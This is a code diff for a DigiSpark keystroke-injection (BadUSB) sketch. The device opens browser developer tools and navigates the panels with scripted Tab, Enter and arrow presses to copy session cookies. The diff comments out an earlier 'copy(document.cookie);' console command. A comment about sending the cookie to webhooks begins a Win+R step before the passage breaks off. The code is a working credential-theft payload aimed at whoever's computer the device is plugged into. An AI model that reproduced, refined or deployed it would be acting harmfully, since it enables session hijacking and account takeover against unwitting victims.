@@ -19,16 +19,42 @@ void setup() {
     DigiKeyboard.delay(4000);
 
     // Open DevTools (F12)
-    //DigiKeyboard.sendKeyStroke(KEY_I, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
+    DigiKeyboard.sendKeyStroke(KEY_I, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
    // DigiKeyboard.delay(1000);
 
     // Open Console (Ctrl + Shift + J)
-    DigiKeyboard.sendKeyStroke(KEY_J, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
+    //DigiKeyboard.sendKeyStroke(KEY_J, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
     DigiKeyboard.delay(1000);
 
+     DigiKeyboard.sendKeyStroke(KEY_ENTER);  // Press Enter  
+    DigiKeyboard.delay(500);
+
+      // Press Tab 6 times
+  for (int i = 0; i < 6; i++) {
+    DigiKeyboard.sendKeyStroke(KEY_TAB);
+    DigiKeyboard.delay(100);
+  }
+
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);  // Press Enter
+  DigiKeyboard.delay(500);
+
+    // Press Down Arrow 11 times
+  for (int i = 0; i < 11; i++) {
+    DigiKeyboard.sendKeyStroke(KEY_DOWN);
+    DigiKeyboard.delay(100);
+  }
+
+     DigiKeyboard.sendKeyStroke(KEY_ENTER);  // Press Enter
+  DigiKeyboard.delay(500);
+
+  DigiKeyboard.sendKeyStroke(KEY_TAB);  // Press Tab
+  DigiKeyboard.delay(500);
+
+  DigiKeyboard.sendKeyStroke(KEY_C, MOD_CONTROL_LEFT);  // Press Ctrl + C
+
     // Run JavaScript to copy session cookie
-    DigiKeyboard.print(F("copy(document.cookie);"));
-    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+   // DigiKeyboard.print(F("copy(document.cookie);"));
+   // DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
     // Sending session cookie to webhooks
       // Open Run (Win + R)
